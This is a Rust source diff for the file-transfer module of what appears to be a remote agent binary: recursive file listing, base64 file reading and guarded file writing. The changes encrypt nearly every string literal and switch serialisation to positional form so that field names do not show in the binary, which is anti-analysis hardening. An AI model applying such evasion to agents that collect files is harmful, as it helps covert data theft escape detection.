@@ -12,14 +12,50 @@ use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 use std::path::{Path, PathBuf, Component};
 use serde::{Serialize, Deserialize};
 
+use crate::strcrypt_rt;
+
 use crate::config::config;
 
-#[derive(Serialize, Deserialize, Debug)]
+/// Serde: positional seq [root_path, total_files_found, total_success,
+/// failed_downloads] - manual impl so field names don't leak into the
+/// agent binary.
+#[derive(Debug)]
 pub struct RecursiveReport {
     pub root_path: String,
     pub total_files_found: usize,
     pub total_success: usize,
     pub failed_downloads: Vec<(String, String)>,
+}
+
+impl Serialize for RecursiveReport {
+    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
+        use serde::ser::SerializeSeq;
+        let mut seq = serializer.serialize_seq(None)?;
+        seq.serialize_element(&self.root_path)?;
+        seq.serialize_element(&self.total_files_found)?;
+        seq.serialize_element(&self.total_success)?;
+        seq.serialize_element(&self.failed_downloads)?;
+        seq.end()
+    }
+}
+
+impl<'de> Deserialize<'de> for RecursiveReport {
+    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
+        struct V;
+        impl<'de> serde::de::Visitor<'de> for V {
+            type Value = RecursiveReport;
+            fn expecting(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result { f.write_str("seq") }
+            fn visit_seq<A: serde::de::SeqAccess<'de>>(self, mut s: A) -> Result<Self::Value, A::Error> {
+                Ok(RecursiveReport {
+                    root_path: s.next_element()?.ok_or_else(|| serde::de::Error::custom("truncated"))?,
+                    total_files_found: s.next_element()?.ok_or_else(|| serde::de::Error::custom("truncated"))?,
+                    total_success: s.next_element()?.ok_or_else(|| serde::de::Error::custom("truncated"))?,
+                    failed_downloads: s.next_element()?.ok_or_else(|| serde::de::Error::custom("truncated"))?,
+                })
+            }
+        }
+        deserializer.deserialize_seq(V)
+    }
 }
 
 // ── Constants ───────────────────────────────────────────────────────────────
@@ -32,10 +68,10 @@ fn ensure_safe_dir(path: &Path) -> Result<(), String> {
     // Single metadata call eliminates TOCTOU between exists()/is_symlink()/is_dir()
     if let Ok(meta) = path.symlink_metadata() {
         if meta.file_type().is_symlink() {
-            return Err(format!("Symlink detected at directory: {}", path.display()));
+            return Err(format!("{} {}", strcrypt::aes_str!("Symlink detected at directory:"), path.display()));
         }
         if !meta.is_dir() {
-            return Err(format!("Path exists but is not a directory: {}", path.display()));
+            return Err(format!("{} {}", strcrypt::aes_str!("Path exists but is not a directory:"), path.display()));
         }
         return Ok(());
     }
@@ -44,11 +80,11 @@ fn ensure_safe_dir(path: &Path) -> Result<(), String> {
         ensure_safe_dir(parent)?;
     }
 
-    std::fs::create_dir(path).map_err(|e| format!("Create dir: {}", e))?;
+    std::fs::create_dir(path).map_err(|e| format!("{} {}", strcrypt::aes_str!("Create dir:"), e))?;
 
     if let Ok(meta) = path.symlink_metadata() {
         if meta.file_type().is_symlink() {
-            return Err(format!("Race: symlink detected at directory: {}", path.display()));
+            return Err(format!("{} {}", strcrypt::aes_str!("Race: symlink detected at directory:"), path.display()));
         }
     }
     Ok(())
@@ -78,12 +114,12 @@ pub fn find_all_files(root: &str) -> (Vec<PathBuf>, Vec<String>) {
     let root_meta = match root_path.symlink_metadata() {
         Ok(meta) => meta,
         Err(e) => {
-            errors.push(format!("Root path does not exist or is inaccessible: {}", e));
+            errors.push(format!("{} {}", strcrypt::aes_str!("Root path does not exist or is inaccessible:"), e));
             return (files, errors);
         }
     };
     if root_meta.file_type().is_symlink() {
-        errors.push(format!("Root path is a symlink: {}", root_path.display()));
+        errors.push(format!("{} {}", strcrypt::aes_str!("Root path is a symlink:"), root_path.display()));
         return (files, errors);
     }
     if root_meta.is_file() {
@@ -91,7 +127,7 @@ pub fn find_all_files(root: &str) -> (Vec<PathBuf>, Vec<String>) {
         return (files, errors);
     }
     if !root_meta.is_dir() {
-        errors.push(format!("Root path is not a file or directory: {}", root_path.display()));
+        errors.push(format!("{} {}", strcrypt::aes_str!("Root path is not a file or directory:"), root_path.display()));
         return (files, errors);
     }
 
@@ -117,18 +153,18 @@ pub fn find_all_files(root: &str) -> (Vec<PathBuf>, Vec<String>) {
                                     }
                                 }
                                 Err(e) => {
-                                    errors.push(format!("Failed to get file type for {}: {}", path.display(), e));
+                                    errors.push(format!("{} {}: {}", strcrypt::aes_str!("Failed to get file type for"), path.display(), e));
                                 }
                             }
                         }
                         Err(e) => {
-                            errors.push(format!("Failed to read entry in {}: {}", current_dir.display(), e));
+                            errors.push(format!("{} {}: {}", strcrypt::aes_str!("Failed to read entry in"), current_dir.display(), e));
                         }
                     }
                 }
             },
             Err(e) => {
-                errors.push(format!("Failed to read directory {}: {}", current_dir.display(), e));
+                errors.push(format!("{} {}: {}", strcrypt::aes_str!("Failed to read directory"), current_dir.display(), e));
             }
         }
     }
@@ -158,12 +194,12 @@ where
     let root_meta = match root_path.symlink_metadata() {
         Ok(meta) => meta,
         Err(e) => {
-            errors.push(format!("Root path does not exist or is inaccessible: {}", e));
+            errors.push(format!("{} {}", strcrypt::aes_str!("Root path does not exist or is inaccessible:"), e));
             return errors;
         }
     };
     if root_meta.file_type().is_symlink() {
-        errors.push(format!("Root path is a symlink: {}", root_path.display()));
+        errors.push(format!("{} {}", strcrypt::aes_str!("Root path is a symlink:"), root_path.display()));
         return errors;
     }
     if root_meta.is_file() {
@@ -171,7 +207,7 @@ where
         return errors;
     }
     if !root_meta.is_dir() {
-        errors.push(format!("Root path is not a file or directory: {}", root_path.display()));
+        errors.push(format!("{} {}", strcrypt::aes_str!("Root path is not a file or directory:"), root_path.display()));
         return errors;
     }
 
@@ -199,16 +235,16 @@ where
                                 }
                                 Err(e) => {
                                     errors.push(format!(
-                                        "Failed to get file type for {}: {}",
-                                        path.display(), e
+                                        "{} {}: {}",
+                                        strcrypt::aes_str!("Failed to get file type for"), path.display(), e
                                     ));
                                 }
                             }
                         }
                         Err(e) => {
                             errors.push(format!(
-                                "Failed to read entry in {}: {}",
-                                current_dir.display(), e
+                                "{} {}: {}",
+                                strcrypt::aes_str!("Failed to read entry in"), current_dir.display(), e
                             ));
                         }
                     }
@@ -216,8 +252,8 @@ where
             }
             Err(e) => {
                 errors.push(format!(
-                    "Failed to read directory {}: {}",
-                    current_dir.display(), e
+                    "{} {}: {}",
+                    strcrypt::aes_str!("Failed to read directory"), current_dir.display(), e
                 ));
             }
         }
@@ -227,16 +263,16 @@ where
 
 pub fn read_file_to_b64(path: &str) -> Result<(String, String), String> {
     let path_obj = Path::new(path);
-    if !path_obj.exists() { return Err(format!("File not found: {:?}", path)); }
+    if !path_obj.exists() { return Err(format!("{} {:?}", strcrypt::aes_str!("File not found:"), path)); }
 
     if let Ok(meta) = path_obj.symlink_metadata() {
         if meta.file_type().is_symlink() {
-            return Err(format!("Symlink detected: {:?}", path));
+            return Err(format!("{} {:?}", strcrypt::aes_str!("Symlink detected:"), path));
         }
     }
 
     let meta = std::fs::metadata(path_obj).map_err(|e| e.to_string())?;
-    let perm_string = if meta.permissions().readonly() { "readonly" } else { "writable" }.to_string();
+    let perm_string = if meta.permissions().readonly() { strcrypt::aes_str!("readonly") } else { strcrypt::aes_str!("writable") };
 
     let mut file = File::open(path_obj).map_err(|e| e.to_string())?;
     let file_size_u64 = meta.len();
@@ -244,8 +280,10 @@ pub fn read_file_to_b64(path: &str) -> Result<(String, String), String> {
     // Fetch the limits once: this function is a single-shot read, not a loop.
     let max_file_size = config().transfer.max_file_size_bytes;
     if file_size_u64 > max_file_size {
-        return Err(format!("File too large ({} MB). Max is {} MB.",
-            file_size_u64 / (1024 * 1024), max_file_size / (1024 * 1024)));
+        return Err(format!("{}{}{}{}{}",
+            strcrypt::aes_str!("File too large ("), file_size_u64 / (1024 * 1024),
+            strcrypt::aes_str!(" MB). Max is "), max_file_size / (1024 * 1024),
+            strcrypt::aes_str!(" MB.")));
     }
 
     if file_size_u64 < config().transfer.small_file_threshold_bytes {
@@ -258,7 +296,7 @@ pub fn read_file_to_b64(path: &str) -> Result<(String, String), String> {
         };
         // Detect files that changed size between metadata() and read
         if file_size_u64 > 0 && bytes_read as u64 != file_size_u64 {
-            return Err(format!("File size changed during read: expected {}, got {}", file_size_u64, bytes_read));
+            return Err(format!("{} {} {} {}", strcrypt::aes_str!("File size changed during read: expected"), file_size_u64, strcrypt::aes_str!("got"), bytes_read));
         }
         return Ok((BASE64.encode(buffer), perm_string));
     }
@@ -282,8 +320,8 @@ pub fn read_file_to_b64(path: &str) -> Result<(String, String), String> {
 
         total_read += n as u64;
         if total_read > max_file_size {
-            return Err(format!("File exceeded {} MB during read (possible infinite stream)",
-                max_file_size / (1024 * 1024)));
+            return Err(format!("{} {} {}", strcrypt::aes_str!("File exceeded"),
+                max_file_size / (1024 * 1024), strcrypt::aes_str!("MB during read (possible infinite stream)")));
         }
 
         let mut combined = std::mem::take(&mut carry);
@@ -304,23 +342,23 @@ pub fn write_file_simple(base_dir: &str, rel_path: &str, b64_data: &str) -> Resu
     for component in Path::new(rel_path).components() {
         match component {
             Component::ParentDir => {
-                return Err("Path contains parent traversal (..)".to_string());
+                return Err(strcrypt::aes_str!("Path contains parent traversal (..)"));
             }
             Component::Prefix(_) | Component::RootDir => {
-                return Err("Path must be relative".to_string());
+                return Err(strcrypt::aes_str!("Path must be relative"));
             }
             _ => {}
         }
     }
     if rel_path.is_empty() || rel_path == "." {
-        return Err("Invalid path".to_string());
+        return Err(strcrypt::aes_str!("Invalid path"));
     }
 
     // Canonicalize the base directory and use it for all operations
     let base = Path::new(base_dir);
-    std::fs::create_dir_all(base).map_err(|e| format!("Create base dir: {}", e))?;
+    std::fs::create_dir_all(base).map_err(|e| format!("{} {}", strcrypt::aes_str!("Create base dir:"), e))?;
     let canonical_base = std::fs::canonicalize(base)
-        .map_err(|e| format!("Cannot canonicalize base dir: {}", e))?;
+        .map_err(|e| format!("{} {}", strcrypt::aes_str!("Cannot canonicalize base dir:"), e))?;
     
     let full_path = canonical_base.join(rel_path);
 
@@ -336,26 +374,26 @@ pub fn write_file_simple(base_dir: &str, rel_path: &str, b64_data: &str) -> Resu
                 .map(|p| std::fs::canonicalize(p))
                 .unwrap_or_else(|| Ok(canonical_base.clone()))
         })
-        .map_err(|e| format!("Cannot canonicalize target: {}", e))?;
+        .map_err(|e| format!("{} {}", strcrypt::aes_str!("Cannot canonicalize target:"), e))?;
     if !canonical_target.starts_with(&canonical_base) {
-        return Err("Path escapes base directory".to_string());
+        return Err(strcrypt::aes_str!("Path escapes base directory"));
     }
 
     // Race-harden: refuse to open if the path is a symlink or hard link
     if let Ok(meta) = full_path.symlink_metadata() {
         if meta.file_type().is_symlink() {
-            return Err("Symlink detected at target path".to_string());
+            return Err(strcrypt::aes_str!("Symlink detected at target path"));
         }
         if is_hardlink(&meta) {
-            return Err("Hard link detected at target path".to_string());
+            return Err(strcrypt::aes_str!("Hard link detected at target path"));
         }
     }
 
-    let bytes = BASE64.decode(b64_data).map_err(|e| format!("B64 Error: {}", e))?;
+    let bytes = BASE64.decode(b64_data).map_err(|e| format!("{} {}", strcrypt::aes_str!("B64 Error:"), e))?;
     // Enforce decoded size limit
     let max_total = config().transfer.max_total_file_size_bytes;
     if bytes.len() as u64 > max_total {
-        return Err(format!("Decoded file exceeds {} MB limit", max_total / (1024 * 1024)));
+        return Err(format!("{} {} {}", strcrypt::aes_str!("Decoded file exceeds"), max_total / (1024 * 1024), strcrypt::aes_str!("MB limit")));
     }
     let mut file = File::create(&full_path).map_err(|e| e.to_string())?;
     file.write_all(&bytes).map_err(|e| e.to_string())?;
